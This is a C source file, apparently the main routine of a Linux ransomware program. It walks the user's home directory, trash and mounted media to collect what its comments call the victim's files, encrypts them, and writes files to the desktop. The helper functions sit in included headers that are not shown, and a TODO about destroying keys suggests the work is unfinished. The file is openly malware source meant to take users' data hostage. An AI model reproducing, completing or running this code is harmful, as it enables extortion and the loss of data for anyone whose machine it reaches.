#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include"lib/func.h"
#include"lib/crypto.h"
#include"lib/struct.h"

// -lcrypto -lz -ldl -static-libgcc


int main(){

    /* Linked list structures */
    List *files = NULL;
    List *encrypted = NULL;
    List *not_encrypted = NULL;

    /* Path variables */
    char * home = get_home_enviroment();
    char * desktop = get_desktop_enviroment(home);
    char * username = get_username();
    char * trash = get_trash_path(home);
    char * media = get_media_path(username);
    // char * test_path = get_test_path(desktop);

    char * test_path = "/home/tarcisio/tests/";
    /* finding all victim's files */
    find_files(&files, home);
    find_files(&files, trash);
    find_files(&files, media);

    /* start encryption */
    encrypt_files(files, &encrypted, &not_encrypted);
    create_files_desktop(encrypted, files, desktop);
    
    /* Free the linked lists*/
    // NEED TO DESTROY THE KEYS INSIDE THE LISTS
    destroy(&files);
    destroy(&encrypted);
    destroy(&not_encrypted);

    /* Free the path variables */
    free(home);
    free(desktop);
    free(username);
    free(trash);
    free(media);
    // free(test_path);

    return 0;
}
